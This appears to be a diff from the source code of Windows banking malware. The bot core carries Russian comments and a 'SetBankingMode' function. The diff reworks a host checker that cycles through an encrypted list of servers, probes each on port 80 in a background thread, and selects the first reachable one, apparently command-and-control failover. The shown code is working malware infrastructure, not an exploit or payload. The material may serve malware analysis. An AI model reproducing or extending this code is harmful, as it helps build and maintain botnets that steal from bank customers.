@@ -4,6 +4,7 @@
 #pragma hdrstop
 
 #include <WinSock.h>
+#include <windows.h>
 
 #include "BotCore.h"
 #include "Plugins.h"
@@ -614,16 +615,11 @@ bool Hosts::CheckHost(PCHAR Host )
    if (STR::IsEmpty(Host))
    	return false;
 
-	WSADATA wsa;
-
-	if ((int)pWSAStartup(MAKEWORD(2, 2), &wsa) != 0 )
-		return false;
-
 	bool ret = false;
 
-	SOCKET Socket = ConnectToHost(Host, 80);
+	SOCKET Socket = ConnectToHostEx(Host, 80, 3);
 
-	if ( Socket != -1 )
+	if ( Socket != INVALID_SOCKET )
 		ret = true;
 
 	pclosesocket( Socket );
@@ -662,6 +658,8 @@ void Hosts::SetBankingMode()
 //---------------------------------------------------------------------------
 
 
+
+
 //****************************************************************************
 //                               THostChecker
 //****************************************************************************
@@ -675,6 +673,11 @@ void _HostChecker_FreeHost(LPVOID Host)
 
 THostChecker::THostChecker(const char *Hosts, bool HostsEncrypted)
 {
+	FThread = NULL;
+	FCheckTime = 0;
+	FHosts = NULL;
+	FTerminated = false;
+
 	if (AnsiStr::IsEmpty(Hosts))
 		return;
 	FHosts = List::Create();
@@ -690,32 +693,81 @@ THostChecker::THostChecker(const char *Hosts, bool HostsEncrypted)
 		// Переходим к следующей строке
 		Temp = STR::End((char*)Temp);
 		Temp++;
-    }
+	}
 }
+//----------------------------------------------------------------------------
 
 
 THostChecker::~THostChecker()
 {
+	FTerminated = true;
+	if (FThread != NULL)
+    	WaitForSingleObject(FThread, INFINITE);
+
     List::Free(FHosts);
 }
+//----------------------------------------------------------------------------
 
 
-DWORD WINAPI _HostChecker_Check(THostChecker *Checker)
+DWORD WINAPI HostCheckerThreadProc(THostChecker *Checker)
 {
-
+	// Выполняем проверку хостов
+    Checker->DoCheckHosts();
+	return 0;
 }
+//----------------------------------------------------------------------------
 
 
-void THostChecker::Check()
+void THostChecker::Check(bool ReCheck)
 {
 	// Функция запускает проверку хостов
-    FThread = StartThread(_HostChecker_Check, this);
+	if (FThread)
+		return;
+
+	// Проверяем необходимость проверки
+	bool NeedCheck = ReCheck ||
+					 FWorkHost.IsEmpty() ||
+					 (DWORD)pGetTickCount() - FCheckTime >= HostCheckInterval;
+
+	if (NeedCheck)
+	{
+        FWorkHost.Clear();
+		FThread = StartThread(HostCheckerThreadProc, this);
+    }
 }
+//----------------------------------------------------------------------------
 
 string THostChecker::GetWorkHost()
 {
 	//Функция возвращает рабочий хост
 
+	// Запускаем проверку
+	Check(false);
+	// Ожидаем окончания
+	if (FThread)
+		WaitForSingleObject(FThread, 10000);
+
+
 	return FWorkHost;
 }
+//----------------------------------------------------------------------------
 
+void THostChecker::DoCheckHosts()
+{
+	// Ищем рабочий хост
+    DWORD Count = List::Count(FHosts);
+	for (DWORD i = 0; i < Count; i++)
+	{
+		string *Host = (string*)List::GetItem(FHosts, i);
+		if (Hosts::CheckHost(Host->t_str()))
+		{
+			FWorkHost = *Host;
+            break;
+        }
+	}
+
+
+    FCheckTime = (DWORD)pGetTickCount();
+	FThread = NULL;
+}
+//----------------------------------------------------------------------------
